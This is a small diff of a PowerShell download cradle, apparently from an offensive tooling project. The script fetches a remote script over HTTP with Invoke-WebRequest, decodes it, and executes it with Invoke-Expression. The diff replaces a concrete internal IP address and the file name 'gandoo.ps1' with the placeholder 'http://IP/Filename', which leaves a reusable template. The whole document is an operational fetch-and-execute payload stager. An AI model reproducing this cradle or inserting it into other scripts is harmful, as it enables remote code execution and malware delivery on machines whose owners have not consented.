@@ -1,5 +1,5 @@
 # URL of the script to download
-$scriptUrl = "http://192.168.23.130/gandoo.ps1"
+$scriptUrl = "http://IP/Filename"
 $scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing
 $scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
 Invoke-Expression -Command $scriptContent
